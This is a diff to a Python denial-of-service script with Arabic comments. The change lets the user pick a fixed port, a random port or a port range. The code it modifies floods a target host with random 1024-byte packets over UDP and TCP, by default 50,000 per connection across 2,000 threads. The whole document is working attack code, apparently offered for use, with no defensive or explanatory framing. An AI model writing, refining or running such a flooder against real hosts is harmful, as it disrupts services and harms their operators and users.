@@ -7,7 +7,7 @@ import threading
 
 ap = argparse.ArgumentParser()
 ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
-ap.add_argument("-p", "--port", type=int, default=0, help="Port (0 for random, range for random: min-max)")
+ap.add_argument("-p", "--port", type=str, default="0", help="Port (e.g., 80, 0 for random 1-65353, or 10000-60000 for range)")
 ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
 ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
 ap.add_argument("-th", "--threads", type=int, default=2000, help="Threads")
@@ -21,8 +21,25 @@ choice = args['choice']
 times = args['times']
 threads = args['threads']
 
-# تحديد إذا كان المستخدم يريد منافذ عشوائية
-use_random_ports = (port_arg == 0)
+# معالجة وسيطة المنفذ
+def parse_port(port_str):
+    if port_str == "0":
+        return (1, 65353)  # نطاق افتراضي
+    elif "-" in port_str:
+        try:
+            min_port, max_port = map(int, port_str.split("-"))
+            return (min_port, max_port)
+        except:
+            return (1, 65353)
+    else:
+        try:
+            fixed_port = int(port_str)
+            return (fixed_port, fixed_port)  # نفس المنفذ للحدين
+        except:
+            return (1, 65353)
+
+min_port, max_port = parse_port(port_arg)
+use_random_ports = (min_port != max_port)  # إذا كان هناك نطاق
 
 def run():
     data = random._urandom(1024)
@@ -30,11 +47,11 @@ def run():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            # اختيار منفذ عشوائي في كل مرة
+            # اختيار منفذ
             if use_random_ports:
-                target_port = random.randint(1, 65353)
+                target_port = random.randint(min_port, max_port)
             else:
-                target_port = port_arg
+                target_port = min_port  # port ثابت
             addr = (str(ip), target_port)
             for x in range(times):
                 s.sendto(data, addr)
@@ -47,11 +64,11 @@ def run2():
     i = random.choice(("[*]","[!]","[#]"))
     while True:
         try:
-            # اختيار منفذ عشوائي في كل مرة
+            # اختيار منفذ
             if use_random_ports:
-                target_port = random.randint(1, 65353)
+                target_port = random.randint(min_port, max_port)
             else:
-                target_port = port_arg
+                target_port = min_port  # port ثابت
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip, target_port))
             s.send(data)
